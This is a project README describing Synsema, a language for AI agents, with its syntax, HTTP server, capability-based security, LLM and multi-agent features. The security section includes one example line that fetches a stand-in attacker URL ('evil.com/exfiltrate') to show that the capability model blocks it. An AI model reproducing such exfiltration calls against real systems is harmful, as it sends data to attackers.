# Synsema

A programming language designed for AI agents.

Synsema is not a framework or a library — it's a language where observability, security, multi-agent coordination, human interaction, and LLM integration are built-in primitives, not afterthoughts. It compiles to a single native binary: no runtime, no GIL, true multi-core.

## Fast *and* secure

Synsema **matches or beats Go** — and adds deny-by-default security none of the
mainstream stacks have. HTTP throughput, same workload, 50 concurrent connections:

| Endpoint | Synsema | Go (net/http) | |
|---|---|---|---|
| `/plaintext` | **47.2k req/s** | 42.8k | beats Go |
| `/health` | 38.7k req/s | 39.4k | ties (98%) |
| `/json` | **41.8k req/s** | 40.7k | beats Go |

Synsema wins on plaintext and JSON and ties on health (run-to-run noise) — squarely in
Go's tier and well above interpreted stacks like FastAPI. Unlike all of them, Synsema
enforces **capability security at the language level** — no network, file, or DB access
without an explicit `require`, route auth and input validation are declarative, and there's
an automatic audit log. Security is a property of the language, not a discipline you have to
remember.

## Install

A single self-contained binary — no Python, no npm, nothing to install on the target.

```bash
# one-liner (Linux/macOS) — once a release is published
curl -fsSL https://synsema.com/install.sh | sh
```

### Build from source

```bash
git clone https://github.com/kitecosmic/synsema.git
cd synsema
cargo build --release --manifest-path engine/Cargo.toml   # → engine/target/release/synsema
```

## Quick start

Create `hello.syn`:

```
let name be "World"
print("Hello, " + name + "!")

task greet(person)
    give "Welcome, " + person

print(greet("Alice"))
```

Run it:

```bash
synsema run hello.syn
```

## Usage

The command is `synsema` (e.g. `synsema run program.syn`,
`synsema serve app.syn`).

```bash
synsema run program.syn              # Run a program
synsema serve app.syn                # Run a program that starts an HTTP server (blocks)
synsema run program.syn -v           # Run with verbose output
synsema run program.syn --secure     # Run in secure mode (all capabilities must be granted)
synsema run program.syn --provider anthropic  # Use Claude as LLM engine
synsema run program.syn --grant net:api.example.com  # Grant a capability
synsema run program.syn --audit      # Show capability audit trail
synsema run program.fsyn             # Run flat (document-style) syntax
synsema repl                         # Interactive mode
synsema check program.syn            # Parse and validate without running
synsema tokens program.syn           # Show token stream
synsema ast program.syn              # Show abstract syntax tree
synsema testgen program.syn          # Auto-generate and run tests
```

## Language overview

### Variables and types

```
let name be "Alice"
let age be 30
let active be true
let items be [1, 2, 3]
let config be {"host": "localhost", "port": 8080}
```

### Tasks (functions)

```
task add(a, b)
    give a + b

task factorial(n)
    when n <= 1
        give 1
    otherwise
        give n * factorial(n - 1)
```

### Flow control

```
when score >= 90
    print("Excellent")
otherwise when score >= 70
    print("Good")
otherwise
    print("Keep trying")

each item in items
    print(item)

match status
    is "pending"
        process()
    is "done"
        archive()
```

### Custom types

```
type Customer
    name: text
    email: text
    balance: number

let c be Customer("Alice", "alice@example.com", 500)
print(name of c)
```

### Pipe operator

```
let result be data |> clean |> validate |> transform
```

### Intentional operations

Instead of loops, express what you want:

```
let expensive be where(products, is_expensive)
let names be collect(users, "name")
let doubled be apply(double, numbers)
let total be reduce(prices, add, 0)
let sorted be sort_by(products, get_price)
let groups be group_by(orders, get_status)
```

### Concurrency

Real, multi-core parallelism — no GIL. `parallel_map` runs a task over a list
concurrently, results in input order, with a bounded number of simultaneous workers:

```
let results be parallel_map(fetch_user, ids, 50)   -- 50 at a time, order preserved
```

`chunk` splits a list into batches — the "10k as 10×1000, then merge" pattern:

```
let batches be chunk(items, 1000)
let partial be parallel_map(process_batch, batches, 10)   -- 10 batches in parallel
let merged be flatten(partial)
```

`parallel_map(task, list)` returns the same result (and order) as `apply(task, list)` —
it only adds concurrency. Fail-fast: the first error cancels the rest and propagates
(wrap the task in `try/recover` to collect partial results instead).

### HTTP server

A native, zero-dependency HTTP server (built on `http.server`). The runtime
enforces a consistent response contract, pagination, auth and input validation.

```
require serve(8080)

task check_token(token)
    when token == "admin-key"
        give {"role": "admin"}
    give nothing

serve on 8080
    auth with check_token

    route "GET /products"
        give sql("SELECT id, name, price FROM products")     -- list → paginated envelope

    route "GET /products/:id"
        let rows be sql("SELECT * FROM products WHERE id = ?", [params.id])
        when length(rows) == 0
            give not_found("product not found")              -- 404
        give rows[0]                                          -- map → object as-is

    route "POST /products" requires auth
        expect body {name: text, price: number}              -- 400 if invalid
        let b be json of request
        sql_exec("INSERT INTO products (name, price) VALUES (?, ?)", [name of b, price of b])
        give created(b)                                       -- 201
```

- **Capability:** `require serve(PORT)` — scoped to the port. Without it, `serve on PORT` fails with a clear error.
- **Request:** `request.json`, `request.body`, `request.headers`, `request.user`, plus `query` and `params` maps.
- **Response contract:** `give <map>` → the object as-is; `give <list>` → `{"items", "count", "total", "cursor"}`; scalar → as-is; nothing → `null`. Helpers: `ok(x)`, `created(x)` (201), `not_found(x)` (404), `fail(code, msg)`.
- **Pagination:** always applied to collections — default `limit` 100, `?limit=` / `?cursor=`, `total` always present. For large tables use `give paged("SELECT ...", [params])` — SQL `LIMIT`/`OFFSET` pushdown with an exact `COUNT(*)` total, nothing fully materialized.
- **Auth:** `requires auth` extracts the `Authorization: Bearer` token, calls the `auth with` task; `nothing` → 401, otherwise the value lands in `request.user`.
- **Validation:** `expect body {field: type}` (`text`, `number`, `bool`, `list`, `map`) → 400 naming the bad field.
- **HTTP semantics:** `405` (with `Allow`) for a known path on the wrong method, `OPTIONS`/`HEAD` handled, malformed JSON → 400.
- **Body limits:** default 1 MB, configurable per server with `max_body "10mb"` (or `"unlimited"`). Real bytes are counted (a lying `Content-Length` or chunked body can't evade it); over the limit → 413 with a clean connection close; large bodies stream to disk (`read_body()` / `request.body_file`), chunked supported.
- **Isolation:** each request runs in its own interpreter/scope, like an agent; only the blackboard and DB are shared. Uncaught errors become 500 — never a server crash.
- **Streaming (SSE):** a route can `stream` and `send` events over time (LLM tokens, feeds, MCP) — `Content-Type: text/event-stream`, flushed per event, client-disconnect-safe, with a `max_streams` concurrency cap (`503` over the limit). `stream` and `give` are mutually exclusive per route.
- **Rate limiting:** `rate_limit N per second|minute|hour` on the server (default) or per route (override; `none` to disable). Token bucket keyed by the real peer IP (not `X-Forwarded-For`), checked before auth, `429` + `Retry-After` + `RateLimit-*` over the limit, stale buckets purged.
- **Soft keywords:** `serve`, `on`, `route`, `auth`, `requires`, `expect`, `max_body`, `max_streams`, `stream`, `send` are only special inside their construction — elsewhere they are ordinary names (`let route be "/x"` works).

See [.synsema-skill/serve.md](.synsema-skill/serve.md) for full details.

### Production web stack — no Caddy/nginx needed

The async-native server adds, natively, what you'd normally put a reverse proxy in front for:

```
require serve(443)
serve on 443
    domain "example.com"
    tls auto "admin@example.com"      -- auto-HTTPS: Let's Encrypt (ACME) + auto-renewal
    redirect https                     -- also listen on :80 and 301 → https
    route "GET /" ...
```

- **TLS:** `tls cert "./c.pem" key "./k.pem"` (manual) or `tls auto "email"` (automatic
  HTTPS via ACME — issuance + background renewal). TLS 1.2+ enforced, HSTS automatic, SNI.
- **HTTP/2:** negotiated via ALPN over TLS (HTTP/1.1 kept).
- **Virtual hosts:** `host "a.com"` / `host "*.tenant.com"` blocks, each with its own
  routes/static/auth/cert; dispatched by the `Host` header.
- **Reverse proxy:** `proxy to "http://upstream"` inside a route forwards the request.
- **Production static files:** ETag + `304`, `Range`/`206`, gzip — on the `static` mounts.

No external proxy, no extra processes — it's all in the one binary.

## Security

### Capabilities

Zero access by default. Declare what you need:

```
require net("api.example.com")
require file("/data/*")

let data be fetch("https://api.example.com/data")
let content be read_file("/data/report.csv")
```

### Intent

Declare what your program is for. The intent is a human-readable description, used for auditing and as context for the LLM. It can be written in any language:

```
intent: "Read customer data from api.shop.com and generate reports"
```

The intent is **descriptive** — it does not authorize actions. Security is enforced by capabilities, which are explicit and predictable:

```
require net("api.shop.com")

fetch("https://api.shop.com/customers")   -- works: capability granted
fetch("https://evil.com/exfiltrate")      -- BLOCKED: no capability for evil.com
```

There is exactly one authorization model — capabilities — so behavior never depends on guessing the meaning of prose. The intent is frozen after declaration: a prompt injection cannot redeclare a broader intent.

### Per-task capabilities

Tasks run in their own sandbox:

```
task fetch_orders()
    require net("api.shop.com")
    give fetch("https://api.shop.com/orders")

-- fetch_orders can ONLY access api.shop.com
-- even if the program has broader net capabilities
```

## LLM integration

The LLM is the reasoning engine, swappable like a database driver:

```
let analysis be analyze sales_data for "trends"
let action be decide between ["refund", "replace"] given complaint
let response be generate "email" given ticket with tone = "empathetic"
```

Configure the provider:

```bash
synsema run program.syn --provider anthropic   # Claude
synsema run program.syn --provider openai       # GPT
synsema run program.syn --provider ollama       # Local model
```

## Human interaction

Approval gates, questions, and confirmations are language primitives:

```
approve "Deploy to production?"
let choice be ask "Which environment?" with ["staging", "prod"]
confirm "Send email to 500 customers?"
show preview as "Email Preview"
```

## Multi-agent coordination

```
agent Researcher
    require net("*.wikipedia.org")
    task search(query)
        let data be fetch(query)
        share data as "research"

agent Writer
    observe "research" as data
    let report be generate "report" given data

spawn Researcher with query = "AI safety"
```

Agents coordinate via:
- **Blackboard**: shared state with versioning and watchers
- **Signals**: inter-agent messaging
- **Resource locks**: preventive conflict detection (not after-the-fact)

## Observability

```
trace "payment_processing"
    log "Processing order " + order_id
    measure "db_query"
        let result be query(sql)
    checkpoint "after_query"
```

### Rich error diagnostics

When something fails, you get:

```
ERROR: orders.syn:12:16: Division by zero

  Location: orders.syn:12:16
  Intent: Calculate order totals

  Source:
     >>   12 |     give total / units

  Variables at failure:
    order = {customer: Alice, quantity: 0, price: 100}

  Suggestions:
    1. Add a guard: when quantity != 0
    2. Add invariant: quantity > 0

  Category: data
  Recoverable: yes
```

### Automatic recovery

The runtime tries to recover before failing:
1. Retry with backoff (for IO errors)
2. Fallback to cached/default data
3. Partial results
4. Speculative alternatives
5. Human escalation with options and impact analysis

## Agent memory and rules

### Progress tracking

```
create_progress("sync", ["fetch", "validate", "update"])
start_step("sync", "fetch")
complete_step("sync", "fetch", "100 items")
-- If the agent crashes, resume_point("sync") returns where to continue
```

### Persistent memory

```
remember("preference", "Customer prefers formal tone", ["communication"])
remember("learning", "API is slow on Mondays", ["api"])
let prefs be recall("preference", ["communication"])
```

### Owner rules

```
add_rule("max_discount", "must", "discount <= 0.20", "pricing")
add_rule("formal_tone", "prefer", "Use formal tone", "communication")
let violations be check_rules("pricing", {"discount": 0.25})
```

Rule levels: `must` (hard block), `should` (warning), `avoid` (preference against), `prefer` (preference for).

## Flat syntax

For document-style readability, use `.fsyn` files:

```
task process_order(order):
    When amount of order > 1000, approve "Large order".
    Otherwise, log "Standard order".
    Then give "processed".
end
```

## Auto-generated tests

```bash
synsema testgen program.syn
```

Automatically generates edge-case tests from your types and task signatures:
- Zero, negative, empty string, empty list, nothing
- Type constructor arity checks
- Invariant verification
- Idempotency tests

## Tests

A conformance corpus plus unit and integration tests:

```bash
cargo test --manifest-path engine/Cargo.toml --workspace
```

Language-level `.syn` tests (using `assert` / `test "..."`) run with the binary:

```bash
synsema test tests/        # runs tests/*.test.syn
```

## Architecture

A single native binary — no external runtime. The engine is organized into focused
modules under `engine/crates/`:

```
engine/crates/
├── synsema-core/         # lexer, parser, AST, types, interpreter, templates
├── synsema-capabilities/ # capability model + intent enforcement
├── synsema-stdlib/       # http, database, cron, server, ACME, mimetypes
├── synsema-agents/       # blackboard, swarm, memory, progress, resource locking
├── synsema-runtime/      # execution engine, serve, parallelism, recovery, persistence, daemon
├── synsema-llm/          # LLM provider, context, validator, human interaction
└── synsema-cli/          # the `synsema` command: run, serve, check, repl, ast, tokens, daemon
```

The interpreter is **synchronous**; concurrency (`parallel_map`) and the web server are
async layers around it. `spawn` agents use OS threads.

## Editor support (syntax highlighting)

A VS Code–family extension highlights `.syn` / `.fsyn` (works in VS Code, Cursor, Windsurf,
VSCodium). Install it **without cloning the repo**:

```bash
curl -L -o synsema.vsix https://github.com/kitecosmic/synsema/releases/latest/download/synsema-vscode.vsix
code --install-extension synsema.vsix      # or: cursor / windsurf --install-extension
```

Source and details: [`editors/vscode/`](editors/vscode/README.md).

## AI Skill (for Claude Code, Codex, etc.)

Synsema includes a structured skill so AI coding assistants can learn the language. The skill is organized as an indexed folder — the AI reads only the sections it needs.

### Install the skill (Claude Code)

```bash
# From the repo
cd synsema && bash install-skill.sh

# Or remote
curl -s https://raw.githubusercontent.com/kitecosmic/synsema/main/install-skill.sh | bash
```

That's it — Claude Code auto-detects the skill via its `SKILL.md` frontmatter. No
`CLAUDE.md` edit needed: just open a `.syn`/`.fsyn` file or type `/synsema`, and the
relevant reference sections load on demand.

### Skill index

The skill lives in `.synsema-skill/` and is organized by topic:

| File | When to read |
|------|-------------|
| [INDEX.md](.synsema-skill/INDEX.md) | **Always read first** — points to everything else |
| [syntax.md](.synsema-skill/syntax.md) | Writing or reading `.syn` code — keywords, operators, statement patterns |
| [builtins.md](.synsema-skill/builtins.md) | Need to know what functions exist — all built-in tasks with signatures |
| [types.md](.synsema-skill/types.md) | Working with data — type system, property access, truthiness |
| [capabilities.md](.synsema-skill/capabilities.md) | Adding security — require, sandbox, intent, per-task scoping |
| [agents.md](.synsema-skill/agents.md) | Multi-agent work — blackboard, swarm, signals, resource locks |
| [llm.md](.synsema-skill/llm.md) | Using AI reasoning — reason, decide, analyze, generate, providers |
| [human.md](.synsema-skill/human.md) | Human interaction — approve, confirm, ask, escalation |
| [observability.md](.synsema-skill/observability.md) | Debugging — trace, log, measure, error diagnostics, recovery |
| [memory.md](.synsema-skill/memory.md) | Agent persistence — progress tracking, memory, owner rules |
| [patterns.md](.synsema-skill/patterns.md) | Common idioms — safe division, pipe chains, intentional ops |
| [structure.md](.synsema-skill/structure.md) | Understanding the codebase — file map with entry points |

### For other AI tools (Codex, Cursor, Windsurf, etc.)

Point the tool at `.synsema-skill/INDEX.md` in the repo root. Each tool has its own way to add context:

- **Codex**: reference the skill folder in your system instructions
- **Cursor**: add `.synsema-skill/` to your project rules or docs
- **Windsurf**: include INDEX.md in your cascade context
- **Any tool**: paste the contents of INDEX.md as system prompt, the AI will know which sub-file to request

### LLM response validation

When Synsema connects to an LLM, responses are validated automatically:

- `decide` responses **must** be exactly one of the given options
- Invalid responses trigger a retry (up to 3 attempts)
- Each retry includes feedback: *"Your response was invalid because X"*
- The LLM receives full program context: intent, variables, rules, memory, progress

## Roadmap

- [x] Native compiled runtime (single static binary, no GIL, real multi-core)
- [x] Real concurrency (`parallel_map` / `chunk`, bounded fan-out)
- [x] Web server capability (`serve on PORT`)
- [x] Streaming responses (Server-Sent Events: `stream` / `send`)
- [x] Rate limiting (`rate_limit N per <window>`, token bucket, per-IP)
- [x] Native web stack: TLS, auto-HTTPS (ACME), virtual hosts, reverse proxy, HTTP/2
- [x] Database (SQLite via `sql` / `db_open`)
- [ ] Async interpreter for C100k+ I/O fan-out (deferred)
- [ ] Distribution: cross-platform binaries, installer, mobile/IoT
- [ ] Package manager for verified capabilities
- [ ] Language server protocol (LSP) for IDE support

## License

[Apache License 2.0](LICENSE). The code is free to use, modify, and distribute,
with an explicit patent grant.

**Trademark:** "Synsema" is a project trademark. The license covers the code, not the
name — forks and derivative works must use a different name (see [NOTICE](NOTICE)).
